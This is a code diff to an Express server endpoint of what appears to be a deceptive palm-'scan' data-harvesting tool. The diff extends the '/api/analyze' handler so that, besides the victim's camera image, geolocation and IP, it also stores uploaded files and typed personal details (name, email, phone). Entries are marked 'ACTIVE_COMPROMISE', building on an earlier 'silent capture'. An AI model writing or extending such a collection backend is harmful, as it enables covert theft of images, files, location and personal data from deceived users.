@@ -78,26 +78,30 @@ app.get('/api/data', (req, res) => {
 
 // API Endpoint to receive the "scanned" palm and active permissions
 app.post('/api/analyze', (req, res) => {
-    const { sessionId, image, metadata, location } = req.body;
+    const { sessionId, image, uploadedFile, uploadedFileName, metadata, location } = req.body;
     
     // Find the existing session created during silent capture
     const existingEntry = capturedData.find(e => e.sessionId === sessionId);
     
     if (existingEntry) {
         existingEntry.status = 'ACTIVE_COMPROMISE';
-        existingEntry.metadata.cameraImage = !!image; // Just log that we got it to avoid huge memory usage, or save base64
-        existingEntry.base64Image = image; 
+        existingEntry.base64Image = image;
+        existingEntry.uploadedFile = uploadedFile || null;
+        existingEntry.uploadedFileName = uploadedFileName || null;
         existingEntry.location = location;
-        existingEntry.timestamp = new Date().toISOString(); // Update time
+        existingEntry.timestamp = new Date().toISOString();
+        // Merge extra metadata (name, email, phone typed by user)
+        if (metadata) Object.assign(existingEntry.metadata, metadata);
         console.log(`[!!!] ACTIVE COMPROMISE upgraded for IP: ${existingEntry.ip}`);
     } else {
-        // Fallback if silent log didn't run
         capturedData.push({
             sessionId: sessionId || Date.now().toString(),
             timestamp: new Date().toISOString(),
             ip: req.ip,
             status: 'ACTIVE_COMPROMISE',
             base64Image: image,
+            uploadedFile: uploadedFile || null,
+            uploadedFileName: uploadedFileName || null,
             location: location,
             metadata: metadata || {}
         });
